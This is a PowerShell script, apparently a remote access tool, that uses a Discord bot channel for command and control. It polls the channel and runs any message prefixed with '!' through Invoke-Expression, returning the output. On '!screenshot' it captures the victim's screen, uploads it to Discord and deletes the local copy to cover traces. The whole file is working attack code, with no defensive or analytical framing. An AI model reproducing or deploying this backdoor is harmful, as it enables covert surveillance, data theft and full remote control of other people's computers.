# Define hardcoded token, channelId, botUserId, and baseUrl
$botUserId = "1282419666022563975"  # Hardcoded bot user ID
$baseUrl = "https://discord.com/api/v10"

# Create a reusable HttpClient
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient

# Set the Authorization header for all requests
$client.DefaultRequestHeaders.Authorization = "Bot $token"
$client.DefaultRequestHeaders.Accept.Add("application/json")

# Function to send a message to Discord
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    # Create request body as JSON
    $body = @{
        "content" = $Message
    } | ConvertTo-Json

    # Create StringContent for HTTP Post request
    $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")

    # Send the POST request to Discord
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $content).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Message sent successfully."
        } else {
            Write-Host "Error sending message. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending message: $_"
    }
}

# Function to capture a screenshot and save it as a file in the %TEMP% directory
function Capture-Screenshot {
    param (
        [string]$filePath = "$env:TEMP\screenshot.png"
    )

    Add-Type -AssemblyName System.Drawing
    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    Write-Host "Screenshot saved to $filePath"
    return $filePath
}

# Function to send an image file to Discord
function Send-DiscordImage {
    param (
        [string]$filePath
    )

    # Read the file into a byte array
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::Parse("form-data; name=`"file`"; filename=`"$fileName`"")
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")

    $multipartContent.Add($fileContent, "file", $fileName)

    # Send the POST request to Discord with the image
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $multipartContent).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Image sent successfully."
        } else {
            Write-Host "Error sending image. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending image: $_"
    }
}

# Function to capture a screenshot, send it, and then delete only the screenshot file
function CaptureAndSendScreenshot {
    $filePath = Capture-Screenshot  # Capture screenshot and get the file path
    Send-DiscordImage -filePath $filePath  # Send the image to Discord

    # Clean up by deleting only the screenshot after sending
    try {
        Remove-Item -Path $filePath -Force  # Delete only the screenshot file
        Write-Host "Screenshot file deleted from $filePath"
    } catch {
        Write-Host "Error deleting screenshot file: $_"
    }
}

# Function to execute a PowerShell command
function Execute-PowerShellCommand {
    param (
        [string]$command
    )

    try {
        # Run the PowerShell command and capture the output
        $output = Invoke-Expression $command  # Runs the PowerShell command
        if ($output) {
            $result = $output -join "`n"  # Join multiline output for Discord message
        } else {
            $result = "Command executed successfully with no output."
        }
    } catch {
        $result = "Error executing command: $_"
    }

    # Limit output to a reasonable size for Discord
    if ($result.Length -gt 2000) {
        $result = $result.Substring(0, 1997) + "..."
    }

    Send-DiscordMessage -Message $result
}

# Function to get messages from Discord
function Get-DiscordMessages {
    try {
        # Add limit to fetch the most recent messages
        $response = $client.GetAsync("$baseUrl/channels/$channelId/messages?limit=10").Result
        if ($response.IsSuccessStatusCode) {
            $content = $response.Content.ReadAsStringAsync().Result
            return $content | ConvertFrom-Json
        } else {
            Write-Host "Error fetching messages. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
            return $null
        }
    } catch {
        Write-Host "Error fetching messages: $_"
        return $null
    }
}

# Initialize the bot by setting the last processed message ID
function Initialize-LastMessageId {
    $messages = Get-DiscordMessages
    if ($messages) {
        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
        $global:lastMessageId = $messages[0].id
        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
    }
}

# Initialize the bot
Initialize-LastMessageId

# Main loop with rate limiting and command filtering
while ($true) {
    $messages = Get-DiscordMessages

    if ($messages) {
        foreach ($message in $messages) {
            # Process only if it's a new message and it's not sent by the bot itself
            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                if ($message.content.StartsWith("!")) {
                    $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase

                    if ($command -eq "screenshot") {
                        CaptureAndSendScreenshot  # Capture, send, and delete the screenshot
                    } else {
                        Execute-PowerShellCommand -command $command
                    }
                }
                $lastMessageId = $message.id  # Update the last processed message ID
            }
        }
    }

    Start-Sleep -Seconds 5
}
